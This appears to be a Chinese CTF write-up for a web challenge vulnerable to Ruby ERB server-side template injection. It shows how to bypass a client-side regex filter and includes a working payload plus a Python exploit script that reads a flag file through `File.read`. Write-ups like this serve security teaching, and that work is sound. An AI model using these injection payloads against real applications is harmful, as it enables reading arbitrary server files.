# X-086-24
## 题目描述

> A web application that repeats the user input back to them reducing the effort of the user to type the same thing again and again. Be careful with what you want to repeat there are validation checks in place but you never know what can go wrong.

## 知识点

模板注入（SSTI）：Ruby ERB 模板语法可通过 `<% %>` / `<%= %>` 执行 Ruby 表达式。

## 解题思路

- 关键路径：`POST /generate`，参数：`sentence`（待渲染内容）与 `number`（重复次数）。
- 猜测服务端可能把用户输入当模板渲染（因为功能是“生成句子”，且返回是模板化页面），尝试用 ERB 注入语法测试：`<%= 1+1 %>`。
- 若页面回显 `2`，则确认 ERB 模板注入成立，进一步用 `<%= File.read('/app/flag.txt') %>` 读取 flag。

## 解题步骤

1. 尝试提交 `<%= 1+1 %>`
![image.png](https://x/x12134804763.png)
结果回显：
![image.png](https://x/x12134943130.png)
查看源代码可知这是前段进行的校验：
```js
// dont allow pecial char in sentence
var regex = /^[a-zA-Z0-9\s]+$/;
if(!regex.test($("#sentence").val())) {
  alert("Sentence should not contain special characters");
  return false;
}
```
2. 直接抓包来绕过前端的检查，重新发送 `<%= 1+1 %>`：
![image.png](https://x/x12135329246.png)

可以看到回显了 `2`，说明的确存在 SSTI。
3. 使用 `<%= File.read('/app/flag.txt') %>&number=1` 读取 flag：
![image.png](https://x/x12135541045.png)
成功回显 flag
## EXP
```python
import re
import requests

url = "http://ip4567/generate"
data = {
    "sentence": "<%= File.read('/app/flag.txt') %>",
    "number": "1"
}

r = requests.post(url, data=data, timeout=5)
print(r.status_code)

m = re.search(r"FLAG\{.*?\}", r.text, re.I)
if m:
    print(m.group(0))
else:
    print(r.text)
```